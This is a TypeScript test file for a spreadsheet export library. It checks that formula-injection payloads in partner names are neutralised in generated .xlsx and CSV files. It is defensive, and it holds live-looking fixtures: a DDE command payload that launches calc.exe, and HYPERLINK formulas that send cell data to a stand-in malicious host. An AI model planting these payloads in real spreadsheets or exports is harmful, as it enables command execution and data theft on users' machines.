// FORMULA INJECTION, PROVEN ON THE BYTES THAT LEAVE THE BUILDING.
//
// The assertion that matters is not "the sanitiser returns an apostrophe"; it
// is "the cell inside the .xlsx a user downloads cannot execute". So these
// tests build a real workbook, unzip it with ./zip.ts, read the worksheet XML
// out, and look at the actual cell.
//
// The payload is a partner name, because that is how it would really arrive:
// `mitra.nama_lengkap` is free text an operator types, it has no business
// reason to reject a leading `=`, and it reaches at least eleven of the thirty
// reports.
import { describe, expect, test } from "bun:test";
import { AnggaranDekompresi, bacaDirektoriZip, bacaEntriZip } from "./zip";
import { bacaTabelXlsx } from "./baca";
import { AWALAN_FORMULA, barisCsv, berpotensiFormula, netralkanFormula, selCsv } from "./sanitasi";
import { teks, tulisXlsx, uang, type Sel } from "./tulis";

/** The canonical DDE payload: Excel offers to run `calc.exe` when this opens. */
const PAYLOAD = "=cmd|' /c calc'!A1";

function sheetXml(berkas: Uint8Array, nomor = 1): string {
  const entri = bacaDirektoriZip(berkas);
  const target = entri.find((e) => e.nama === `xl/worksheets/sheet${nomor}.xml`)!;
  return new TextDecoder().decode(bacaEntriZip(berkas, target, new AnggaranDekompresi()));
}

/** The text of one `<is><t>` cell, exactly as it sits in the file. */
function selTeksMentah(xml: string, ref: string): string {
  const re = new RegExp(`<c r="${ref}"[^>]*><is><t[^>]*>([\\s\\S]*?)</t></is></c>`);
  const m = re.exec(xml);
  if (!m) throw new Error(`sel ${ref} tidak ditemukan di lembar`);
  return m[1]!;
}

describe("sel teks yang diekspor tidak bisa dieksekusi", () => {
  const baris: Sel[][] = [
    [teks("Kode", true), teks("Nama Mitra", true), teks("Outstanding", true)],
    [teks("M-001"), teks(PAYLOAD), uang("1500000.00")],
  ];
  const berkas = tulisXlsx([{ nama: "Aging Piutang", baris }]);
  const xml = sheetXml(berkas);

  test("mitra bernama =cmd|' /c calc'!A1 keluar sebagai teks inert", () => {
    const b2 = selTeksMentah(xml, "B2");
    // The apostrophe is the neutralisation, and the character after it is
    // where the payload starts: nothing was deleted.
    expect(b2).toBe("&apos;=cmd|&apos; /c calc&apos;!A1");
    // Decoded, this is what a spreadsheet sees. It does NOT begin with `=`.
    expect(bacaTabelXlsx(berkas).baris[1]![1]).toBe(`'${PAYLOAD}`);
    expect(bacaTabelXlsx(berkas).baris[1]![1]!.startsWith("=")).toBe(false);
  });

  test("tidak ada elemen formula di mana pun dalam berkas", () => {
    // The structural half of the guarantee: even if the sanitiser were removed,
    // this writer has no `<f>` and no API that could produce one.
    expect(xml).not.toContain("<f>");
    expect(xml).not.toContain("<f ");
  });

  test("nama mitra biasa tidak disentuh sama sekali", () => {
    const wajar = tulisXlsx([
      { nama: "X", baris: [[teks("PT Maju Jaya"), teks("Jl. Merdeka No. 1, RT 03/RW 04")]] },
    ]);
    const x = sheetXml(wajar);
    expect(selTeksMentah(x, "A1")).toBe("PT Maju Jaya");
    expect(selTeksMentah(x, "B1")).toBe("Jl. Merdeka No. 1, RT 03/RW 04");
  });

  test("keenam awalan berbahaya, termasuk tab dan carriage return", () => {
    const muatan = AWALAN_FORMULA.map((a) => `${a}HYPERLINK("https://jahat/"&A1,"klik")`);
    const wb = tulisXlsx([{ nama: "X", baris: muatan.map((m) => [teks(m)]) }]);
    const dibaca = bacaTabelXlsx(wb).baris;
    muatan.forEach((m, i) => {
      const nilai = dibaca[i]![0]!;
      expect(nilai).toBe(`'${m}`);
      expect(berpotensiFormula(nilai)).toBe(false);
    });
  });

  test("angka negatif tetap angka, bukan teks berapostrof", () => {
    // `-250000.50` starts with `-`, which is on the dangerous list. It must NOT
    // be neutralised, because it is a NUMERIC cell and never passes through
    // the text path at all. Neutralising it would turn every negative rupiah
    // in every statement into text no column could foot.
    const wb = tulisXlsx([{ nama: "X", baris: [[uang("-250000.50")]] }]);
    expect(sheetXml(wb)).toContain("<v>-250000.50</v>");
    expect(bacaTabelXlsx(wb).baris[0]![0]).toBe("-250000.50");
  });
});

describe("CSV, di mana serangannya justru lebih langsung", () => {
  test("payload di dalam tanda kutip tetap dinetralkan", () => {
    // Quoting alone is not a defence: Excel strips the quotes and then
    // evaluates what is inside. The apostrophe has to be within them.
    expect(selCsv(PAYLOAD)).toBe(`"'=cmd|' /c calc'!A1"`);
  });

  test("kutip ganda di dalam nilai digandakan sesuai RFC 4180", () => {
    expect(selCsv('PT "Maju" Jaya')).toBe('"PT ""Maju"" Jaya"');
  });

  test("satu baris CSV utuh", () => {
    expect(barisCsv(["M-001", PAYLOAD, "1500000.00"])).toBe(
      `"M-001","'=cmd|' /c calc'!A1","1500000.00"`,
    );
  });
});

describe("netralkanFormula, aturannya sendiri", () => {
  test("teks kosong dan teks biasa lewat apa adanya", () => {
    expect(netralkanFormula("")).toBe("");
    expect(netralkanFormula("Kredit macet - hapus buku")).toBe("Kredit macet - hapus buku");
  });

  test("penerapan kedua tidak menambah apostrof kedua", () => {
    expect(netralkanFormula(netralkanFormula("=1+1"))).toBe("'=1+1");
  });
});
